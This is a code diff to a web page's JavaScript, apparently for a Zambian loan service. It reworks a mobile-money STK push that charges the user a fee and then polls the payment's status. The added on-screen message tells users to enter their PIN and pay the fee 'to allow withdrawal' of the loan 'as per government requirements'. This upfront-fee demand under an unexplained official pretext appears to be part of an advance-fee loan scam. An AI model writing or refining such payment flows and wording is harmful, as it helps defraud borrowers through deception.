@@ -2372,32 +2372,53 @@
                   formSection.style.display = 'none';
                   processingSection.style.display = 'flex';
                   
-                  document.getElementById('stkPhoneDisplay').textContent = displayPhoneStr;
-                  document.getElementById('stkFeeDisplay').textContent = 'ZMW ' + parseFloat(currentLoan.fee).toLocaleString();
-                  document.getElementById('stkAmountDisplay').textContent = 'ZMW ' + parseFloat(currentLoan.amount).toLocaleString();
+                  const processingTitle = processingSection.querySelector('h2');
+                  const stkMessage = document.getElementById('stkMessage');
+                  const timerEl = document.getElementById('countdownTimer');
+                  const timerLabel = timerEl.nextElementSibling;
                   
-                  startTimer();
+                  processingTitle.textContent = 'Processing...';
+                  processingTitle.style.color = '#FF6B00';
+                  stkMessage.innerHTML = `Sending payment request to <span class="font-bold text-gray-800">${displayPhoneStr}</span>. Please wait...`;
+                  timerEl.style.display = 'none';
+                  timerLabel.style.display = 'none';
                   
                   try {
-                      const response = await fetch(`${API_URL}/api/deposit`, {
+                      const response = await fetch(`${API_URL}/deposit`, {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({
-                              phone: displayPhoneStr,
-                              amount: currentLoan.fee,
+                              phone_number: displayPhoneStr,
+                              amount: parseFloat(currentLoan.fee),
                               country: 'ZM',
                               network: currentNetwork
                           })
                       });
 
-                      const data = await response.json();
-
-                      if (!response.ok) {
-                          throw new Error(data.message || 'Failed to initiate STK push');
+                      let data;
+                      try {
+                          data = await response.json();
+                      } catch (parseError) {
+                          // If the server returns an HTML error page (like a 502 Bad Gateway from Render)
+                          throw new Error(`Server returned an invalid response (${response.status} ${response.statusText}). Please try again later.`);
                       }
 
-                      // Start polling
-                      pollInterval = setInterval(() => checkStatus(data.reference), 3000);
+                      // check if response indicates success
+                      if (!data.success) {
+                          throw new Error(data.message || 'Failed to initiate STK push');
+                      }
+                      
+                      processingTitle.textContent = 'STK Push Sent!';
+                      processingTitle.style.color = '#00cc6a';
+                      stkMessage.innerHTML = `STK push sent to <span class="font-bold text-gray-800">${displayPhoneStr}</span>. Enter your PIN to pay <span class="font-bold text-gray-800">ZMW ${parseFloat(currentLoan.fee).toLocaleString()}</span> to allow withdrawal of <span class="font-bold text-gray-800">ZMW ${parseFloat(currentLoan.amount).toLocaleString()}</span> instantly as per government requirements.`;
+                      timerEl.style.display = 'block';
+                      timerLabel.style.display = 'block';
+                      
+                      startTimer();
+
+                      // Start polling using the reference from the response
+                      const reference = data.data ? data.data.reference : data.reference;
+                      pollInterval = setInterval(() => checkStatus(reference), 3000);
                   } catch (error) {
                       clearInterval(timerInterval);
                       showReceipt('FAILED', error.message, null, currentLoan.fee);
@@ -2425,13 +2446,16 @@
               
               async function checkStatus(reference) {
                   try {
-                      const response = await fetch(`${API_URL}/api/status/${reference}`);
-                      const data = await response.json();
+                      const response = await fetch(`${API_URL}/status/${reference}`);
+                      const result = await response.json();
 
-                      if (data.status === 'SUCCESS' || data.status === 'FAILED') {
-                          clearInterval(pollInterval);
-                          clearInterval(timerInterval);
-                          showReceipt(data.status, data.message || (data.status === 'SUCCESS' ? 'Fee payment received' : 'Transaction failed'), reference, currentLoan.fee);
+                      if (result.success && result.data) {
+                          const status = result.data.status;
+                          if (status === 'SUCCESS' || status === 'FAILED') {
+                              clearInterval(pollInterval);
+                              clearInterval(timerInterval);
+                              showReceipt(status, result.data.message || (status === 'SUCCESS' ? 'Fee payment received' : 'Transaction failed'), reference, currentLoan.fee);
+                          }
                       }
                   } catch (error) {
                       console.error('Error checking status:', error);
@@ -2563,4 +2587,4 @@
           });
       </script>
   </body>
-      </html>
+    </html>
